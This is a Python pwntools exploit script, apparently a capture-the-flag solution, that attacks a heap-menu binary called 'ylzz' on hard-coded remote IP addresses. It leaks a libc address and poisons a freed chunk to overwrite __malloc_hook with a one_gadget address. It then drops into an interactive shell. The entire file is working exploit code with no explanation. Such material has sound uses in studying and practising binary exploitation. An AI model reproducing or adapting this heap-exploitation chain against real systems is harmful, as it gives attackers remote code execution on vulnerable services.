#!/usr/bin/env python
# -*- coding: utf-8 -*-
# -*- author: n0trix -*-

from pwn import *

#context.terminal = ['tmux','splitw','-v']
context.log_level = 'debug'

#io = process('./ylzz')
#io = remote('112.126.71.170',45123)
io = remote('8.131.69.237',45123)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
one = [0x45226,0x4527a,0xf0364,0xf1207]

def add():
    io.sendline('1')

def dele(idx):
    io.sendline('2')
    io.sendline(str(idx))

def edit(idx,con):
    io.sendline('3')
    io.sendline(str(idx))
    io.send(con)

def show(idx):
    io.sendline('4')
    io.sendline(str(idx))
    return io.recv()

def do_glob(pattern):
    io.sendline('5')
    io.sendline(pattern)

do_glob('/dev/*')
sleep(1)
add() #0
sleep(1)
libc_base = u64(show(0))-3951480
log.success('libc : '+hex(libc_base))
malloc_hook = libc_base + libc.sym['__malloc_hook']
free_hook = libc_base + libc.sym['__free_hook']
sleep(1)
add() #1
sleep(1)
dele(1)
sleep(1)
edit(1,p64(malloc_hook-0x23))
sleep(1)
#edit(2,p64(free_hook-19))
#gdb.attach(io)
add() #2
sleep(1)
add() #3
#edit(3,(0x13-8)*'A'+p64(libc_base+one[1])+p64(libc_base+libc.sym['realloc']+2))
sleep(1)
edit(3,0x13*'A'+p64(libc_base+one[3]))
#edit(3,'aaa'+p64(libc_base+one[0]))
#dele(2)
sleep(1)
add()
io.interactive()
